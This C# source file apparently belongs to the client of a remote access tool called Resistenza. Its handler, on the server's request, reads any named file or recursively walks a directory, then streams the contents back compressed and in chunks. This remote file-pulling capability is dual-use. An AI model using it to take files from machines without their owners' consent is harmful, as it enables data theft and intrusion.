using Newtonsoft.Json.Serialization;
using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Resistenza.Common.Tools;
using Resistenza.Common.Packets.Logic;
using Resistenza.Client.Logic;

namespace Resistenza.Common.Packets
{
    public class FileDownloadRequest : IPacket
    {
        public string Type {  get; set; }
        public string FileName { get; set; }
        public bool IsDirectory { get; set; }
        
        
        public FileDownloadRequest() {

            Type = this.GetType().ToString();
            
        }

        public async Task HandleAsync(SecureStream ServerStream, CancellationTokenSourceWithId CancelOperation, SemaphoreSlim Lock)
        {

            if (!IsDirectory) // è richiesto il download di un file singolo
            {
                try
                {
                    await SendSingleFileAsync(FileName, ServerStream, false, true, CancelOperation, Lock);
                }
                catch (OperationCanceledException)
                {
                    CancelOperation.Token.ThrowIfCancellationRequested();
                }             
            }
            else
            {

                List<string> SubDirsAndFiles = RecursiveDirectoryIterator(FileName);

                foreach (string FilePath in SubDirsAndFiles)
                {

                    bool IsLastOfRequest;

                    if(FilePath == SubDirsAndFiles.Last())
                    {
                        IsLastOfRequest = true;
                    }
                    else
                    {
                        IsLastOfRequest = false;
                    }

                    try
                    {
                        await SendSingleFileAsync(FilePath, ServerStream, true, IsLastOfRequest, CancelOperation, Lock);
                    }
                    catch(OperationCanceledException)
                    {
                        CancelOperation.Token.ThrowIfCancellationRequested();
                    }
                    

                    await Task.Delay(300);
                }
            }

        }
            

        private async Task<bool> SendSingleFileAsync(string FilePath, SecureStream ServerStream, bool RelativePath, bool LastOfRequest, CancellationTokenSourceWithId CancelOperation, SemaphoreSlim Lock)
        {

            FileDownloadResponse Response = new FileDownloadResponse();

            try
            {
                if(CancelOperation.IdOfTaskToBeCancelled == TasksIds.CLIENT_DOWNLOAD_TASK_ID || CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS)
                {
                    CancelOperation.Token.ThrowIfCancellationRequested();
                }
                            
                int ThreeMegasInBytes = 3145728;

                if (!RelativePath)
                {
                    Response.FileName = FilePath.Split("\\").Last();
                }
                else
                {
                    string FileInFolderPath = string.Empty;

                    foreach (string PathChunk in FilePath.Split("\\").Reverse())
                    {
                        if (PathChunk != FileName.Split("\\").Last())
                        {
                            FileInFolderPath = FileInFolderPath.Insert(0, "\\" + PathChunk);
                        }
                        else
                        {
                            FileInFolderPath = FileInFolderPath.Insert(0, FileName.Split("\\").Last());
                            break;

                        }
                    }

                    Response.FileName = FileInFolderPath;
                }

                FileInfo FileToSend = new FileInfo(FilePath);
                long FileSize = FileToSend.Length;
                

                if(FileToSend.Length > ThreeMegasInBytes)
                {


                    int TotalBytesRead = 0;

                    while(TotalBytesRead < FileSize)
                    {
                        if (CancelOperation.IdOfTaskToBeCancelled == TasksIds.CLIENT_DOWNLOAD_TASK_ID || CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS)
                        {
                            CancelOperation.Token.ThrowIfCancellationRequested();
                        }
                        byte[] Buffer = new byte[ThreeMegasInBytes];
                        bool IsLastChunk = TotalBytesRead + Buffer.Length > FileSize;
                        //List<byte> Buffer = new List<byte>();
                        using (BinaryReader Reader = new BinaryReader(new FileStream(FilePath, FileMode.Open)))
                        {
                            
                            Reader.BaseStream.Seek(TotalBytesRead, SeekOrigin.Begin);
                            Reader.Read(Buffer, 0, Buffer.Length);

                        }
                        FileDownloadResponse PartialFile = new();
                        ; //IsLastChunk ? Buffer : new ArraySegment<byte>(Buffer, 0, (int)FileSize - TotalBytesRead).Array;
                        PartialFile.IsPart = true;
                        PartialFile.FileName = Response.FileName;
                        PartialFile.IsLastOfRequest = (IsLastChunk && LastOfRequest);
                        

                        if (IsLastChunk)
                        {
                            int Offset = (int)(FileSize - TotalBytesRead);
                            byte[] SlicedArray = new ArraySegment<byte>(Buffer, 0, Offset).ToArray();
                            PartialFile.FileBytes = FastCompression.Compress(SlicedArray); //Per evitare che venga inviato l'intero buffer di cui una parte è vuota
                        }
                        else
                        {
                            PartialFile.FileBytes = FastCompression.Compress(Buffer);
                        }

                        await Lock.WaitAsync();
                        await ServerStream.SendPacketAsync(PartialFile);
                        Lock.Release();
                        await Task.Delay(200);

                        TotalBytesRead += Buffer.Length;

                    }                    
                }

                else
                {
                    Response.FileBytes = FastCompression.Compress(await File.ReadAllBytesAsync(FilePath));
                    Response.IsPart = false;
                    Response.IsLastOfRequest = LastOfRequest;
                    await Lock.WaitAsync();
                    await ServerStream.SendPacketAsync(Response);
                    Lock.Release();
                    await Task.Delay(30);

                }

                return true;
            }
            catch (Exception e)
            {
                switch (e)
                {
                    case OperationCanceledException:
                        CancelOperation.Token.ThrowIfCancellationRequested();
                        return true;
                    case FileNotFoundException:

                        Response.Error = "File requested cannot be found.";

                        break;

                    case UnauthorizedAccessException:
                        Response.Error = $"Access to {FileName} is denied";
                        break;

                    default:
                        Response.Error = "Unknown error while trying to read file bytes. Report this, error details:" + e.Message;
                        break;

                }
                await Lock.WaitAsync();
                await ServerStream.SendPacketAsync(Response);
                Lock.Release();
                return false;

            }

        }

       

        private static List<string> RecursiveDirectoryIterator(string DirPath)
        {
            var AllFiles = new List<string>();


            foreach (var File in Directory.GetFiles(DirPath))
            {
                AllFiles.Add(Path.Combine(DirPath, File));
            }

            foreach (var SubDir in Directory.GetDirectories(DirPath))
            {
                AllFiles.AddRange(RecursiveDirectoryIterator(SubDir));
            }

            return AllFiles;


        }








    }
    

}
